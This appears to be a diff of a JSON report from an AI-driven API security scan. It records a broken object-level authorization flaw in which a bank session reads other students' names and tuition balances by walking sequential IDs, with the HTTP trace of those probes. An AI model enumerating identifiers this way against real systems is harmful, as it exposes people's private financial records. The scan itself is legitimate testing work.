@@ -2,14 +2,29 @@
   "target": "https://shekin.tail97139a.ts.net",
   "model": "moonshotai/kimi-k3.1-pro",
   "summary": null,
-  "findings": [],
+  "findings": [
+    {
+      "title": "BOLA exposes another student's tuition record",
+      "severity": "high",
+      "endpoint": "/api/bank/tuition/student/AC00000034",
+      "evidence": "{\"student\":{\"studentId\":\"AC00000034\",\"name\":\"0306446\",\"tuitionCents\":\"200000\"}}",
+      "impact": "An authenticated caller can supply another student's sequential ID and read that student's identifying name and tuition balance without authorization."
+    },
+    {
+      "title": "BOLA exposes student tuition by sequential ID",
+      "severity": "high",
+      "endpoint": "/api/bank/tuition/student/AC00000035",
+      "evidence": "{\"student\":{\"studentId\":\"AC00000035\",\"name\":\"shekin\",\"tuitionCents\":\"125000\"}}",
+      "impact": "Changing the student identifier returns another student's name and tuition amount, allowing unauthorized disclosure of student financial data."
+    }
+  ],
   "detected": [
     {
       "title": "Any signed-in bank user can read a student's name and tuition balance by id",
       "severity": "medium",
-      "endpoint": "/api/bank/tuition/student/AC00000063",
-      "evidence": "/api/bank/tuition/student/AC00000063 -> 200 {\"student\":{\"studentId\":\"AC00000063\",\"name\":\"Scan Student\",\"tuitionCents\":\"4925000\"}}\n/api/bank/tuition/student/AC00000050 -> 200 {\"student\":{\"studentId\":\"AC00000050\",\"name\":\"0306776\",\"tuitionCents\":\"125000\"}}",
-      "impact": "The bank session retrieved 2 student records (AC00000063, AC00000050) including name and outstanding tuition. Those records belong to acadia student accounts, not to the bank user. The handler filters on the supplied identifier only - it never checks that the caller is linked to the student - so any authenticated bank user can walk the sequential identifier space and read every student's financial record."
+      "endpoint": "/api/bank/tuition/student/AC00000034",
+      "evidence": "/api/bank/tuition/student/AC00000034 -> 200 {\"student\":{\"studentId\":\"AC00000034\",\"name\":\"0306446\",\"tuitionCents\":\"200000\"}}\n/api/bank/tuition/student/AC00000035 -> 200 {\"student\":{\"studentId\":\"AC00000035\",\"name\":\"shekin\",\"tuitionCents\":\"125000\"}}",
+      "impact": "The bank session retrieved 2 student records (AC00000034, AC00000035) including name and outstanding tuition. Those records belong to acadia student accounts, not to the bank user. The handler filters on the supplied identifier only - it never checks that the caller is linked to the student - so any authenticated bank user can walk the sequential identifier space and read every student's financial record."
     }
   ],
   "trace": [
@@ -23,23 +38,30 @@
     {
       "step": 1,
       "tool": "http_request",
-      "request": "GET /api/bank/payments as bank",
-      "status": 200,
-      "body": "{\"payments\":[]}"
-    },
-    {
-      "step": 1,
-      "tool": "http_request",
       "request": "GET /api/school/enrollments as school",
       "status": 200,
       "body": "{\"enrollments\":[{\"id\":\"16\",\"code\":\"BUSI 1703\",\"title\":\"Introduction to Business\",\"term\":\"Fall 2026\",\"weekday\":\"Wednesday\",\"start_time\":\"13:00:00\",\"tuition_cents\":\"300000\",\"grade\":null},{\"id\":\"8\",\"code\":\"COMP 2663\",\"title\":\"Software Engineering\",\"term\":\"Fall 2026\",\"weekday\":\"Wednesday\",\"start_time\":\"11:00:00\",\"tuition_cents\":\"300000\",\"grade\":null},{\"id\":\"6\",\"code\":\"COMP 3123\",\"title\":\"Computer Security\",\"term\":\"Fall 2026\",\"weekday\":\"Monday\",\"start_time\":\"09:00:00\",\"tuition_cents\":\"300000\",\"grade\":null},{\"id\":\"7\",\"code\":\"COMP 3553\",\"title\":\"Computer Graphics\",\"term\":\"Fall 2026\",\"weekday\":\"Tuesday\",\"start_time\":\"10:00:00\",\"tuition_cents\":\"300000\",\"grade\":null},{\"id\":\"17\",\"code\":\"ECON 1013\",\"title\":\"Introduction to Economics\",\"term\":\"Fall 2026\",\"weekday\":\"Thursday\",\"start_time\":\"14:00:00\",\"tuition_cents\":\"300000\",\"grade\":null},{\"id\":\"18\",\"code\":\"ENGL 1406\",\"title\":\"Introduction to Literature\",\"term\":\"Fall 2026\",\"weekday\":\"Friday\",\"start_time\":\"11:00:00\",\"tuition_cents\":\"300000\",\"grade\":null},{\"id\":\"19\",\"code\":\"HIST 1013\",\"title\":\"Introduction to History\",\"term\":\"Fall 2026\",\"weekday\":\"Monday\",\"start_time\":\"14:00:00\",\"tuition_cents\":\"300000\",\"grade\":null},{\"id\":\"14\",\"code\":\"MATH 1013\",\"t"
     },
     {
+      "step": 1,
+      "tool": "http_request",
+      "request": "GET /api/school/admin/students as school",
+      "status": 403,
+      "body": "{\"error\":\"Access denied for this account role\"}"
+    },
+    {
       "step": 2,
       "tool": "http_request",
-      "request": "GET /api/bank/tuition/student/AC00000001 as bank",
-      "status": 404,
-      "body": "{\"error\":\"Student ID not found\"}"
+      "request": "GET /api/bank/tuition/student/AC00000034 as bank",
+      "status": 200,
+      "body": "{\"student\":{\"studentId\":\"AC00000034\",\"name\":\"0306446\",\"tuitionCents\":\"200000\"}}"
+    },
+    {
+      "step": 2,
+      "tool": "http_request",
+      "request": "GET /api/bank/payments as bank",
+      "status": 200,
+      "body": "{\"payments\":[]}"
     },
     {
       "step": 2,
@@ -49,116 +71,33 @@
       "body": "{\"profile\":{\"display_name\":\"Scan Student\",\"program\":\"BSc Computer Science\",\"year_of_study\":2,\"tuition_cents\":\"4925000\"},\"legacy\":[{\"code\":\"COMP 2003\",\"title\":\"Data Structures\",\"term\":\"Fall 2026\",\"grade\":\"B+\"},{\"code\":\"COMP 3113\",\"title\":\"Network Security\",\"term\":\"Fall 2026\",\"grade\":\"A-\"},{\"code\":\"MATH 1213\",\"title\":\"Linear Algebra\",\"term\":\"Winter 2026\",\"grade\":null}],\"enrollments\":[{\"id\":\"16\",\"code\":\"BUSI 1703\",\"title\":\"Introduction to Business\",\"term\":\"Fall 2026\",\"weekday\":\"Wednesday\",\"start_time\":\"13:00:00\",\"grade\":null},{\"id\":\"8\",\"code\":\"COMP 2663\",\"title\":\"Software Engineering\",\"term\":\"Fall 2026\",\"weekday\":\"Wednesday\",\"start_time\":\"11:00:00\",\"grade\":null},{\"id\":\"6\",\"code\":\"COMP 3123\",\"title\":\"Computer Security\",\"term\":\"Fall 2026\",\"weekday\":\"Monday\",\"start_time\":\"09:00:00\",\"grade\":null},{\"id\":\"7\",\"code\":\"COMP 3553\",\"title\":\"Computer Graphics\",\"term\":\"Fall 2026\",\"weekday\":\"Tuesday\",\"start_time\":\"10:00:00\",\"grade\":null},{\"id\":\"17\",\"code\":\"ECON 1013\",\"title\":\"Introduction to Economics\",\"term\":\"Fall 2026\",\"weekday\":\"Thursday\",\"start_time\":\"14:00:00\",\"grade\":null},{\"id\":\"18\",\"code\":\"ENGL 1406\",\"title\":\"Introduction to Literature\",\"term\":\"Fall 2026\",\"weekday\":\"Friday\",\"start_time\":\"11"
     },
     {
-      "step": 2,
-      "tool": "http_request",
-      "request": "GET /api/school/admin/students as school",
-      "status": 403,
-      "body": "{\"error\":\"Access denied for this account role\"}"
+      "step": 3,
+      "tool": "record_finding",
+      "args": {
+        "title": "BOLA exposes another student's tuition record",
+        "severity": "high",
+        "endpoint": "/api/bank/tuition/student/AC00000034",
+        "evidence": "{\"student\":{\"studentId\":\"AC00000034\",\"name\":\"0306446\",\"tuitionCents\":\"200000\"}}",
+        "impact": "An authenticated caller can supply another student's sequential ID and read that student's identifying name and tuition balance without authorization."
+      }
     },
     {
-      "step": 3,
+      "step": 4,
       "tool": "http_request",
-      "request": "GET /api/bank/tuition/student/AC00000002 as bank",
-      "status": 404,
-      "body": "{\"error\":\"Student ID not found\"}"
-    },
-    {
-      "step": 3,
-      "tool": "http_request",
-      "request": "GET /api/bank/tuition/student/AC00000062 as bank",
-      "status": 404,
-      "body": "{\"error\":\"Student ID not found\"}"
-    },
-    {
-      "step": 3,
-      "tool": "http_request",
-      "request": "GET /api/bank/tuition/student/AC00000063 as bank",
+      "request": "GET /api/bank/tuition/student/AC00000035 as bank",
       "status": 200,
-      "body": "{\"student\":{\"studentId\":\"AC00000063\",\"name\":\"Scan Student\",\"tuitionCents\":\"4925000\"}}"
-    },
-    {
-      "step": 4,
-      "tool": "http_request",
-      "request": "GET /api/bank/tuition/student/AC00000064 as bank",
-      "status": 404,
-      "body": "{\"error\":\"Student ID not found\"}"
-    },
-    {
-      "step": 4,
-      "tool": "http_request",
-      "request": "GET /api/bank/tuition/student/AC00000065 as bank",
-      "status": 404,
-      "body": "{\"error\":\"Student ID not found\"}"
-    },
-    {
-      "step": 4,
-      "tool": "http_request",
-      "request": "GET /api/bank/tuition/student/AC00000003 as bank",
-      "status": 404,
-      "body": "{\"error\":\"Student ID not found\"}"
+      "body": "{\"student\":{\"studentId\":\"AC00000035\",\"name\":\"shekin\",\"tuitionCents\":\"125000\"}}"
     },
     {
       "step": 5,
-      "tool": "http_request",
-      "request": "GET /api/bank/accounts/61 as bank",
-      "status": 404,
-      "body": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot GET /api/bank/accounts/61</pre>\n</body>\n</html>\n"
-    },
-    {
-      "step": 5,
-      "tool": "http_request",
-      "request": "GET /api/bank/payments/1 as bank",
-      "status": 404,
-      "body": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot GET /api/bank/payments/1</pre>\n</body>\n</html>\n"
-    },
-    {
-      "step": 5,
-      "tool": "http_request",
-      "request": "GET /api/school/enrollments/16 as school",
-      "status": 404,
-      "body": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot GET /api/school/enrollments/16</pre>\n</body>\n</html>\n"
-    },
-    {
-      "step": 6,
-      "tool": "http_request",
-      "request": "GET /api/bank/tuition/student/AC00000010 as bank",
-      "status": 404,
-      "body": "{\"error\":\"Student ID not found\"}"
-    },
-    {
-      "step": 6,
-      "tool": "http_request",
-      "request": "GET /api/bank/tuition/student/AC00000020 as bank",
-      "status": 404,
-      "body": "{\"error\":\"Student ID not found\"}"
-    },
-    {
-      "step": 6,
-      "tool": "http_request",
-      "request": "GET /api/bank/tuition/student/AC00000030 as bank",
-      "status": 404,
-      "body": "{\"error\":\"Student ID not found\"}"
-    },
-    {
-      "step": 7,
-      "tool": "http_request",
-      "request": "GET /api/bank/tuition/student/AC00000040 as bank",
-      "status": 404,
-      "body": "{\"error\":\"Student ID not found\"}"
-    },
-    {
-      "step": 7,
-      "tool": "http_request",
-      "request": "GET /api/bank/tuition/student/AC00000050 as bank",
-      "status": 200,
-      "body": "{\"student\":{\"studentId\":\"AC00000050\",\"name\":\"0306776\",\"tuitionCents\":\"125000\"}}"
-    },
-    {
-      "step": 7,
-      "tool": "http_request",
-      "request": "GET /api/bank/tuition/student/AC00000060 as bank",
-      "status": 404,
-      "body": "{\"error\":\"Student ID not found\"}"
+      "tool": "record_finding",
+      "args": {
+        "title": "BOLA exposes student tuition by sequential ID",
+        "severity": "high",
+        "endpoint": "/api/bank/tuition/student/AC00000035",
+        "evidence": "{\"student\":{\"studentId\":\"AC00000035\",\"name\":\"shekin\",\"tuitionCents\":\"125000\"}}",
+        "impact": "Changing the student identifier returns another student's name and tuition amount, allowing unauthorized disclosure of student financial data."
+      }
     }
   ]
 }
